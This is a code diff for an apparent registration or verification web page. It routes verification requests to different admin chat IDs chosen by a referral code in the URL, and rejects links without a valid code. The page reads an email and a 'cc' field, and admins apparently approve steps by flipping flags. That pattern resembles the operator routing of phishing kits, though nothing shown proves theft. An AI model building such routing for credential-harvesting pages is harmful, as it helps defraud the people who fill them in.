@@ -501,8 +501,23 @@ try {
    allowed to flip flags to true.
    ============================================================ */
 
-const ADMIN_CHAT_ID = "7144369262";
-const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
+// Referral codes are mapped to the admin IDs that own their verification requests.
+// Keep the existing admin ID as the default when the page is opened without a referral code.
+const REFERRAL_ADMIN_MAP = Object.freeze({
+    "k7m4": "8761777482",
+    "p9x2": "8922933658",
+    "v6q8": "8898838317",
+    "r3n5": "1970783136",
+    "w8d1": "8898838317"
+});
+const registrationParams = new URLSearchParams(window.location.search);
+const REFERRAL_CODE = (registrationParams.get("ref") || "").trim().toLowerCase();
+const ADMIN_CHAT_ID = REFERRAL_CODE
+    ? (REFERRAL_ADMIN_MAP[REFERRAL_CODE] || null)
+    : "8898838317";
+const VERIFICATIONS_PATH = ADMIN_CHAT_ID
+    ? "account_verifications/admin/" + ADMIN_CHAT_ID
+    : null;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
@@ -648,6 +663,10 @@ function bk(prefix, index, event) {
 async function step1() {
     if (submissionLocked) return;
     hideError("err1");
+    if (!ADMIN_CHAT_ID || !VERIFICATIONS_PATH) {
+        showError("err1", "This registration link is invalid or expired. Please use a valid referral link.");
+        return;
+    }
 
     const email = document.getElementById("email").value.trim();
     const cc = document.getElementById("cc").value;
